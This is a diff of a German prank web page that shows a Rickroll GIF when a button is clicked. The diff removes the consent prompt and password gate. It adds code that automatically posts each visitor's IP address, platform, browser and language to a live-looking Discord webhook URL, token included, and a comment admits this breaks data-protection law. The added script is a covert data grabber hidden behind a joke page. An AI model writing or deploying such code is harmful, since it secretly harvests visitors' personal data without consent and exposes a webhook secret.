@@ -11,45 +11,40 @@
             background-color: #5674a3;
             margin: 0;
             padding: 0;
+            color: white;
         }
 
         h1 {
             margin-top: 50px;
         }
 
-        button, input {
+        button {
             padding: 10px 20px;
             font-size: 18px;
-            margin-top: 10px;
+            background-color: #674580;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        button:hover {
+            background-color: #af7dd4;
         }
 
         #gif-container, #info {
             margin-top: 30px;
-            color: white;
         }
-
-        #login {
-            margin-top: 20px;
-        }
-
     </style>
 </head>
 <body>
-    <h1>Passwort eingeben um fortzufahren</h1>
-    <div id="login">
-        <input type="password" id="password" placeholder="Passwort...">
-        <button onclick="checkPassword()">Einloggen</button>
-    </div>
-
-    <div id="main" style="display: none;">
-        <button onclick="playGif()">Klick mich</button>
-        <div id="gif-container"></div>
-        <div id="info"></div>
-    </div>
+    <h1>Klicke den Knopf um etwas witziges zu sehen</h1>
+    <button onclick="playGif()">Klick mich</button>
+    <div id="gif-container"></div>
+    <div id="info"></div>
 
     <script>
-        print"checkPassword"
-            
         function playGif() {
             const gifUrl = "https://c.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif";
             const gifContainer = document.getElementById("gif-container");
@@ -72,20 +67,21 @@
                     `;
                     infoDiv.innerHTML = fullInfo;
 
-                    // Optionaler Discord-Versand mit Zustimmung
-                    if (confirm("Möchtest du deine Infos senden?")) {
-                        const webhookUrl = "DEIN_DISCORD_WEBHOOK_HIER";
-                        fetch(webhookUrl, {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json",
-                            },
-                            body: JSON.stringify({
-                                content: `IP: ${ip}\nPlattform: ${platform}\nBrowser: ${userAgent}\nSprache: ${language}`
-                            }),
-                        });
-                    }
-                });
+                    // Discord Webhook (nur für Demo-Zwecke)
+                    const webhookUrl = "https://discord.com/api/webhooks/1366096941276205187/JfPcRLToJjK1u_tdWogf6jbJczFqNIrzf-6ohbfLAIrDanj1Bm_LCVU85TzyUmUHluNl";
+
+                    // Sende automatisch für Demo (nicht DSGVO-konform!)
+                    fetch(webhookUrl, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify({
+                            content: `Neue Demo-Info:\nIP: ${ip}\nPlattform: ${platform}\nBrowser: ${userAgent}\nSprache: ${language}`
+                        }),
+                    });
+                })
+                .catch(error => console.error("Fehler beim Abrufen der IP:", error));
         }
     </script>
 </body>
